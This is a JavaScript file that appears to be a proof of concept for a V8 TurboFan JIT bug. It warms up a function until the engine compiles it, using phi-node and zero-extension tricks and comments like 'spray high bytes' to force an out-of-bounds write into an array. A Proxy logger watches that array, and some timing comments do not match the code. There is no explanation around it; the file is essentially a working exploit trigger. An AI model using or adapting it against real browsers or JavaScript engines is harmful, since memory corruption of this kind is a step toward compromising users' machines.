// Handler for the Proxy to intercept set operations
// Function to execute the for loop
function monitorOobArray() {
  for (let i = 0; i < oob_array.length + 10; i++) { // Extend the loop to check beyond
    console.log(`Index ${i}:`, oob_array[i]);
  }
}

// Set the interval to 5 milliseconds
const intervalId = setInterval(monitorOobArray, 1);

setTimeout(() => {
  clearInterval(intervalId);
  console.log('Stopped monitoring oob_array.');
}, 100); // 10000 milliseconds = 10 seconds



const handler = {
  set(target, property, value) {
    const index = Number(property);
    if (!isNaN(index)) {
      if (index < 0 || index >= target.length) {
        console.warn(`Out-of-Bounds Write Detected: Attempting to set index ${index} to ${value}`);
      } else {
        console.log(`Setting index ${index} to ${value}`);
      }
    } else {
      console.log(`Setting property ${property} to ${value}`);
    }
    return Reflect.set(target, property, value);
  }
};



// Initialize the proxied oob_array
var oob_array = new Proxy(new Array(5), handler);

// Rest of your PoC code remains the same
var arrx = new Array(150);
arrx[0] = 1.1;

var fake = new Uint32Array(10);
fake[0] = 1;
fake[1] = 3;
fake[2] = 2;
fake[3] = 4;
fake[4] = 5;
fake[5] = 6;
fake[6] = 7;
fake[7] = 8;
fake[8] = 9;

var tahir = 0x1;

function poc(a) {
  oob_array[0] = 0x500;
  let just_a_variable = fake[0];
  let another_variable3 = fake[7];
  if (a % 7 == 0)
    another_variable3 = 0xff00000000; // spray high bytes
  another_variable3 = Math.max(another_variable3, tahir);
  another_variable3 = another_variable3 >>> 0;
  var index = fake[3];
  var for_phi_modes = fake[6];
  let c = fake[1];
  
  // Giant loop for generating cyclic graph
  for (var i = 0; i < 10; i++) {
    if (a % 3 == 0) {
      just_a_variable = c;
    }
    if (a % 37 == 0) {
      just_a_variable = fake[2];
    }
    if (a % 11 == 0) {
      just_a_variable = fake[8];
    }
    if (a % 17 == 0) {
      just_a_variable = fake[5];
    }
    if (a % 19 == 0) {
      just_a_variable = fake[4];
    }
    if (a % 7 == 0 && i >= 5) {
      for_phi_modes = just_a_variable;
      just_a_variable = another_variable3;
    }
    if (i >= 6) {
      for (let j = 0; j < 5; j++) {
        if (a % 5 == 0) {
          index = for_phi_modes;
          oob_array[index] = 0x500; // zero extends before getting value
        }
      }
    }
    for_phi_modes = c;
    c = just_a_variable;
  }
  
  // Zero extend
  return [index, BigInt(just_a_variable)];
}


for (let i = 2; i < 0x500; i++) {
  poc(i); // Compile using turbofan
}

for (let i = 0; i < oob_array.length + 10; i++) { // Extend the loop to check beyond
  console.log(`Index ${i}:`, oob_array[i]);
}

poc(7 * 5);
